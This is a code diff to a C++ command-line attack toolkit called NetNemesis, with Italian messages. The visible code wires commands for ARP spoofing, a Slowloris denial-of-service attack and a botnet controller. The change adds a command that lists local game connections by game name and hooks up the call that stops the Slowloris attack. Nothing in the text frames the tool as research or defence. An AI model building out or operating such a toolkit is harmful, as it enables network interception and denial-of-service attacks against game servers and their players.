@@ -126,6 +126,13 @@ void NetNemesisCLI::run() {
                 std::cout << "  - " << s.first << ":" << s.second << std::endl;
             }
         }
+        else if (cmd == "connections") {
+            auto conns = scanner.getConnections();
+            Utils::logInfo("Connessioni di gioco locali: " + std::to_string(conns.size()));
+            for (const auto &c : conns) {
+                std::cout << "  - " << c.first << ":" << c.second << " (" << getGameName(c.second) << ")" << std::endl;
+            }
+        }
         else if (cmd == "exit" || cmd == "quit") {
             g_running = false;
             botnet.stop();
@@ -152,8 +159,8 @@ void NetNemesisCLI::run() {
             attack_engine.executeARPSpoof(args[1], args[2]);
         }
         else if (cmd == "stop_slowloris") {
-            // Aggiungi metodo per fermare slowloris
             Utils::logInfo("Fermando Slowloris...");
+            attack_engine.stopSlowloris();
         }
         else if (cmd == "help") {
             std::cout << "\033[36m╔══════════════════════════════════════════════════════════════╗\n"
@@ -171,6 +178,7 @@ void NetNemesisCLI::run() {
                          "║  scan                         - Network scanner              ║\n"
                          "║  scan_stop                    - Ferma scanner              ║\n"
                          "║  servers                      - Lista server trovati       ║\n"
+                         "║  connections                  - Connessioni di gioco locali ║\n"
                          "║                                                              ║\n"
                          "║  \033[33mBOTNET\033[36m                                                     ║\n"
                          "║  botnet                       - Menu configurazione          ║\n"
